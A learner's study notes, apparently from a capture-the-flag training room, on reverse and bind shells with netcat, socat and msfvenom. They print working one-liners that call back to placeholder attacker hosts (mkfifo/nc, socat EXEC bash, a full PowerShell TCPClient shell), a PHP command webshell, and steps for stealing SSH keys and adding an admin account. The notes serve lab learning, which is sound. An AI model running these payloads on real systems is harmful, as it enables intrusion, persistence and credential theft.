@@ -1,0 +1,307 @@
+
+
+What is a shell
+=================
+
+Intro and tips
+----------------
+
+- For a bind shell, use -e tag to execute bash on the host machine.
+
+	nc -lvnp 1234 -e /bin/bash
+
+	- So when received a connection from us, nc will execute and give bash access on the target machine.
+
+Tools
+------
+
+- Netcat
+	- Netcat shells can be unstable and easy to lose a shell.
+- Evil-winrm:
+	- Great tool check it out
+- Socat
+	- Socat is netcat just strong and stable. The problem is it's not by default on every linux VM, and syntax is a bit tough.
+
+- Msf - multi/handler
+	- Part of msf suite, and great for sending staged paylaods.
+- msfvenom
+
+Difference between msfvenom and msf?
+	- Msfvenom can create payloads, reverse and bind shells.
+	- MSF can do pretty much everything ranging from exploits to automating the attack and releasing backdoor.
+
+Types of shells
+-----------------
+
+- Reverse Shells; Easy to use, stable, helps bypass firewall ( because the connection was made from the host ).
+
+- Bind Shells; Less stable, might be blocked by firewall.
+
+- Interactive: like ssh, powershell, zsh etc. which tend to help us interact with the program after executing them.
+
+- Non interactive: vice versa; and these shells dont allow interactive commands to be run.
+
+Netcat and shell stabilization
+--------------------------------
+
+Meaning of stablizing:
+	- Tab autocomplete
+	- Arrow keys to the rescue
+	- Ctrl+C to kill process
+
+- Going to cover 3 techniques for stabilizing shells in netcat
+
+Technique 1:
+	- Python
+
+	CMD 1: python -c "import pty;pty.spawn('/bin/bash')"
+	Recommended Commmand: /bin/bash -i (if this doesn't work then try the upper way)
+		- To make the shell look prettier
+
+	CMD 2: export TERM=xterm
+		- To give access to term commands such as clear
+
+	CMD 3: stty raw -echo; fg
+		- This does 2 things, turns of the terminal echo (by doing this you get access to tab autocompletes, ctrl + C and arrow keys)
+			- If you wonder what is terminal echo, then it is something you notice when you recieve a netcat shell, that your commands are repeating when you execute them, like whoami prints the command whoami not the root or the name of the user (sometimes shows both)
+
+Technique 2:
+	- rlwrap
+
+	- This technique is particularly useful when dealing with windows shells, which are hard to stabilize. 
+	- You need to install this in your kali/ubuntu before using it(apt install) 
+
+	CMD: rlwrap nc -lvnp <port>
+
+	- This is just a short way of stabilizing shell that was shown in technique one... I would recommend using this for stabilizing windows shell.
+
+Technique 3:
+	- socat
+
+	- Socat on windows is as unstable as netcat on windows... Socat is better used for linux targets.
+	- I really don't understand it's use, we can stabilize shells on linux target using technique 1 and rlwrap... This ain't doing anything good. So ain't including it here. 
+
+Now, one more thing that comes is... The terminal tty size(TeleType size)
+
+Note: tty is connected to your terminal session. Even if you're using tmux there is different tty sessions open for every terminal window, panel. 
+	- tty is just terminal settings that it inherits from
+
+	- Infact, the echo you get in a terminal explained in the technique 1, is because you connect to this file. Research it out. 
+
+	- Basically, /dev/pts are your current terminal session. You can view which is your tty by simply typing 'tty' in your terminal's session, and it will tell you where your session is stored on system.
+
+Similarly, your stty is what manages your session's property like, font color, terminal size, which puts effect on programs opening in terminal like nano... 
+	- You can view all the terminal properties by using -a flag, and then set the terminal properties on the host machine with...
+
+		stty rows <number>
+		stty cols <number>
+
+	- There are other properties too, you can just search for stty cheatsheet, and it will give you list of changes you can make to your terminal session. For the sake of these notes, I am going to cut it short.
+
+Note: You can use http.server in python3 module instead of SimpleHTTPServer on python2, as you will be opening the server mostly on your system you have python3.
+
+Socat
+======
+
+Reverse Shell
+---------------
+
+To open a listener with socat:
+	
+	socat TCP-L:<port> -
+		- Here, dash is the representation for other arguments if we want to add.
+
+The command to connect back:
+	
+	Linux: socat TCP:<localIP>:<localPORT> EXEC:"bash -li"
+		- -l and -i flags are used to make the shell interactive
+	Windows: socat TCP:<localIP>:<localPORT> EXEC:powershell.exe, pipes
+		- pipes are used to force powershell to use unix stdin and stdout.
+
+Bind Shell
+-----------
+
+On target: Linux: socat TCP-L:<port> EXEC:"bash -li"
+On target: Windows: socat TCP-L:<port> EXEC:powershell.exe,pipes
+
+On attacker machine: socat TCP:<IP>:<PORT> -
+	- Again '-' is used to specify further arguments
+
+Advance features of socat
+--------------------------
+
+	Attacker: socat TCP-L:<port> FILE:'tty',raw,echo=0
+		- This command opens up a connection between listener and a file (except executing something with EXEC).
+		- Specifying we are using new tty (new session)and setting the echo to be 0 so command won't repeat on terminal.
+			- This is equivalent to ctrl+z and then stty raw -echo; fg in python technique of stabilization, you saw above.
+
+	Target: socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+		- Breaking this down, we are connecting back to us. executing interactive bash and enabling the following features.
+		pty: allocates a pseudomterminal on the target - part of stabilization process.
+		stderr: makes sure, that any error messages should be shown.
+		sigint: passes ctrl+c commands into the subprocess rather than closing the connection.
+		setsid: create a separate new session for the connecion made.
+		sane: stabilizes the terminal.
+
+Note: To workout with socat... You need to socat on the target machine... So use python3 http.server to transfer the socat from the github repo... (Download and transfer). 
+	- After that, open the listener port... with netcat... on your machine...
+	- then make a connection from the host... and to stabilize the the shell... first open the socat listener in another tab/panel, and through the opened netcat connection, connect the socat target command there.
+
+	Note: If at any point the connection with socat is giving any errors you can use -d -d flag to increase the verbosity.
+
+Encrypted Socat Shell
+----------------------
+
+Why we use them?
+	The answer is simple, to bypass the firewalls for the commands that were blocked to execute remotely... As the channel's encrypted this makes it more easier.
+
+- There aint much difference between socat shell and encrypted socat shell...
+	- The difference is OPENSSL is used in place of TCP, and two more arguments are added: cert, verify
+		- cert=<file>: You have to specify a file with the certificate that encrypts your connection
+			Note: You need to create a pem file(certificate file) around 2048 bit RSA key. Then you can include it in the cert parameter. 
+		- verify=0: This will disable the checking that our certificate has been signed by a recognizing authority.
+
+- To create a certificate for connection you can use the following command:
+	openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt && cat shell.key shell.crt > shell.pem
+		- What we did here, is create 2 files, 1 key file and the other is certificate file... Later we combined both the file into one named 'shell.pem', which will be inserted as the value of cert parameter. (Requires a pem file)
+
+For a revese shell, 
+	to open a listener for encrypted channel:
+		socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+
+	Then to connect to that channel we run the following command on the target machine:
+		socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+For a bind shell, 
+	Target machine: 
+		socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+		I took an example shell here.
+	
+	Attacker Machine:
+		socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+
+Note: The certificate must be included with the listener.
+
+Common Shell Payloads
+-----------------------
+
+- You can find netcat listeners in the /usr/share/ directory. That directory is worth checking out for other things too. 
+
+You can create listener for a bind shell with msfvenom, or remember this command.
+
+	mkfifo /tmp/f; nc -lvnp `port` < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+
+Let's break down this command for ease of understanding.
+	- Starting with mkfifo is used to create named pipes... Now, hope you're familiar with piping (redirecting one's output into another). Now, here we can create named pipes, in our case we build an empty one for our netcat session.
+	- Then we open a listening port on (separated from the first one using semicolon) (and btw this command out of the 3 runs as long as it receives a connection).
+		- What happens then is, as soon as netcat listener receives a connection, that connnection then OPENS THAT NAMED PIPE AS A SESSION WITH THE CONNECTION inside it. 
+	- Then that connection's output is piped into the bash shell with `| /bin/bash` and output of that connection is redirected to /tmp/f, which is then redirected to our stdout with any errors found.
+		- To be in brief... /tmp/f with errors (which was selected by 2>) are redirected to stdout (with &1)
+
+	After the connection is established, that pipe in which our listener was opened is deleted. with rm /tmp/f, which was our third command.
+
+Similarly for a reverse shell command would be:
+	
+	mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+Now, if we talk about payloads for reverse shell in windows, this is a copy paste command, because neither am I smart enough with knowledge of powershell, yet... Nor, it is worth remembering such long commands, not even if you understand the command. Just a copy paste... Or, best, you can find this in msfvenom.
+
+	powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+msfvenom
+---------
+
+- This is everything to do with payloads encoders,nops etc... But not exploits... You need to manually work out with exploit from searchsploit/exploitdb.
+	- Not full exploits, but you can do use this for creating shellcodes, that can exploit buffer overflow.
+
+Flags:
+	-f <format>
+	-o <output file>
+
+	LHOST=<local ip>
+	LPORT=<local port>
+
+Staged vs stageless/non-staged payloads:
+	
+	- Staged are what sent in stages, like first the stager is sent, when activated on the target, it then downloads the data of actual payload and run the payload.
+		- They help in bypassing the firewall, by first sending a small stager, which is hard to get detected by the firewall/IDS.
+		- They need to work with multi/handler that is msf for sending and receiving the connection.
+
+	Stageless are compact payloads, they are general pupose and are mostly used to payloads, you somehow take them to the target host, and then on that host, you gotta run the payload and you get a shell immidiately... 
+		- They can be handfully crafted by msfvenom, and don't need msf to operate on them
+		- Easier to use, but bulkier
+
+Note: Meterpreter shell is one of the most sophisticated, easy-to-use, stable shell to use, even when dealing with windows target...
+	- The only drawback is, meterpreter shells can only be caught up in msf, which is banned from certain examination.
+
+
+Payload Naming Conventions
+----------------------------
+
+- Now, this is something new, I learnt from this room, and I literally didn't had an idea about this... That this is the pattern... May be because I didn't focus on msf due to making a habit of solving boxes without it.
+
+The basic convention is as follows:
+	
+	<OS>/<arch>/<payload>
+
+	Linux: linux/x86/shell_reverse_tcp (32 bit linux payload)
+	Windows: windows/shell_reverse_tcp (32 bit windows payload)
+
+	Windows: windows/x64/shell_reverse_tcp (64 bit windows payload)
+
+- Now, note the difference here, for linux the arch for 32 bit is specified... for windows 32 bit, the payloads are in windows folder... (May be because they are general... as they can run on both 32 bit and 64 bit). To find, the windows 64 bit payloads, you can find them in x64 folder.
+
+Breaking the payload section further:
+	
+	- The '_' in payload represents that the payload is stageless.
+		eg. shell_reverse_tcp
+
+	- The '/' in payload name represents that the payload is staged.
+		eg. shell/reverse_tcp
+
+- So for windows 64 bit a staged payload will be,
+	windows/x64/meterpreter/reverse_tcp
+
+- For Windows 32 bit a stageless payload will be,
+	windows/meterpreter_reverse_tcp
+
+Note: A command that can come handy... msfvenom --list payloads
+
+Multi/Handler
+--------------
+
+Now, this section is nothing special I know all of it so am gonna skip it.
+
+Webshells
+-----------
+
+- As we have seen the common shell payloads, well those were for shell access via shell access, here we are gonna see how we can get shell from web technologies i.e. Gaining access via web server.
+
+- Webshell is a script that runs inside a web server(usually php and asp), which executes code on the server.
+	- Commands are either sent through a HTML form or passed in as URL arguments.
+
+Note: you can create your own php script to execute commands on the server, with one liner php.
+	<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
+	- So when this command executes on the web server it will give the output of the command we passed in via cmd GET parameter in the HTML document.
+	- The <pre> tag added was to ensure that the output is formatted correctly on the page.
+
+- There are variety of webshells available in /usr/share/webshells directory (including php-reverse-shell from pentestmonkey)
+
+- Just to make sure the command executes on the server correctly, make sure to url encode the reverse shell payload you're gonna use, before passing it into the the argument.
+
+Next Steps: General Tips
+--------------------------
+
+- Once get a shell, to maintain that shell, get the ssh private key from .ssh directory and then log in via ssh, (if you can and ssh is running). 
+
+- For windows, (options are limited) try to find the user's password... 
+	- There are services like VNC, and filezilla which leave the user's password in registry (stored in plaintext)
+
+	- There will be cases that you become system and then you can create further user accounts, give admin privileges and then log in via rdp, telnet, psexec, winrm or any thing.
+
+		net user <username> <password> /add
+
+		net localgroup administrators <username> /add
+
+That's it for the room... It was worth gaining this knowledge.
